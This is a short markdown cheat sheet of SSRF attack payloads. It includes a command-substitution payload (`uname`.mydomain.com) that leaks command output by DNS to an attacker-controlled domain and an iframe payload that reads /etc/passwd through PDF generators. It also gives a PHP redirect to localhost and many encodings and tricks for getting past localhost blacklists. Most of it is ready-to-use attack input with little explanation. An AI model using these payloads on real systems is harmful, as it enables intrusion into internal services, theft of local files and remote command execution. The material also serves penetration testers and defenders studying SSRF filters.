# SSRF


## RCE
If you have SSRF, test for RCE with this payload:

```
`uname`.mydomain.com
```

---

## Blacklist bypass
* Pass URL encoded parameters in order to achieve parameter injection
* Use `<iframe src="file:///etc/passwd>` with PDF generators
* URL encode `localhost` to `%6c%6f%63%61%6c%68%6f%73%74`
* Change HTTP version from `1.1` to `0.9` and remove the Host header
* Try `127.0.0.1::ffff::` or `::ffff:127.0.0.1`
* Mix case `LoCaLhOsT`
* Embed credentials `http://attacker@localhost`
* Use URL fragments `http://attacker#localhost`
* Add directory `http://localhost/random`
* Try using an IPv6 address as sometimes blacklists do not block them

### Redirect
Make a request to a page that you control with the following code:

```php
<?php header("location: http://127.0.0.1"); ?>
```
### DNS
* Use these tools to bypass internal hostnames
	* [nip.io](http://nip.io)
	* [xip.io](http://xip.io/)
  * [1u.ms](http://1u.ms/)
	* [sslip.io](https://sslip.io/)

### Encoding
Try different encodings:

* Hex `0x7f.0x0.0x0.0x1`
* Octal `0177.0.0.01`
* Url `http://%31%32%37%2e%30%2e%30%2e%31`
* Dword [`http://2130706433`]
* Remove spaces `0177000000000001`
* Mix them `0177.0.0.0x1`
* `http://31.10.590` converts to [`http://31.10.2.78/`] because (2\*256)+78
* Convert the IP address to binary representation like `01111111.00000000.00000000.00000001` and after removing the dots convert the number in decimal and you get [`http://2130706433`](http://127.0.0.1/)
* Add zeroes `http://127.0.0000000.1/`
